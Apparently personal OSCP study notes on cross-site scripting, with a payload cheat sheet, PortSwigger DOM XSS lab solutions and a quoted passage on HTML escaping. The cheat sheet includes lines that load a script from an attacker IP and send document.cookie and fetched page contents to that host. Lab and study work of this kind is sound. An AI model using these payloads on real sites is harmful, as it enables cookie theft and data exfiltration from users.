# XSS & XXE

{% embed url="https://brandonrussell.io/OSCP-Notes/XXMore.html" %}

{% embed url="https://brandonrussell.io/OSCP-Notes/XXXEMore.html" %}

```
; breaks current command
// comments out rest
<script>alert(1)</script>
javascript:
Escaping attribute tags and payload using repo

#load image
<img src="http://10.10.14.6/image.png" onerror=alert(1)/>

#load script
<script src="http://10.10.14.6/script.js"></script>

#script.js
fetch('http://10.10.14.6/from_script/' + document.cookie);

#load script
<script>
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.6/exfil?body=" + btoa(body));
})
</script>
```

{% embed url="https://github.com/payloadbox/xss-payload-list" %}

{% embed url="https://medium.com/@sevenoffsec/portswiggers-xss-labs-solved-with-explanation-part-1-678206556964" %}

{% embed url="https://infosecwriteups.com/zero-to-hero-dom-xss-d291d62432d8" %}

> Well, you should know when and how to spot XSS. Regarding OSCP exam, I don’t think XSS will be there since your goal is getting RCE on the target machine.
>
> Yes, some HTB boxes have “bot” which clicks on XSS link and then you see HTTP request on your server. But I don’t think this is going to appear in your exam.

> If the user-supplied input is printed inside an HTML attribute, you also need to escape quotation marks or you would be vulnerable inputs like this:
>
> ```xml
> " onload="javascript-code" foobar="
> ```
>
> You should also escape the ampersand character as it generally needs to be encoded inside HTML documents and might otherwise destroy your layout.
>
> So you should take care of the following characters: < > & ' "
>
> You should however not completely strip them but replace them with the correct HTML codes i.e. _\&lt; \&gt; \&amp; \&quot; \&#x27;_

## Define

### DOM XSS

Document Object Model

Data from attacker-controllable source (eg. URL) is passed to a 'sink' where dynamic code execution takes place

## Labs

### Lab 3 (DOM)

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Our goal is to escape the search query and execute our malicious code, so that's in the `trackSearch` funciton \[SINK]

Where do we enter this code? The query variable which fetches our input via `window.location.search`

```
'"><script>alert(1)</script>
```

### Lab 4 (DOM)

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

The `innerHTML` sink doesn’t accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements.

```
"><img src=x onerror=alert(1)>
```

### Lab 5 (DOM)

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

An XSS output should be seen visually so sending payloads via Repeater may not be the smartest play

Like before, try escape the query statement before executing script

{% code overflow="wrap" %}
```
https://website/product?productId=3&storeId=%3C/option%3E%3Cscript%3Ealert(1)%3C/script%3E
```
{% endcode %}

Burp showed GET method wasn't allowed so my guess is this was still sent via POST

### Lab 6 (XSS attribute encoded angle brackets)

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

As seen, we are working with the input tag, can't use `<script>` &#x20;

```
<input onfocus=javascript:alert(1) autofocus>
?search=a"onfocus%3Djavascript%3Aalert(1)+autofocus
```

`onfocus` basically performs the specific action when that field is clicked/used and `autofocus` does it auto
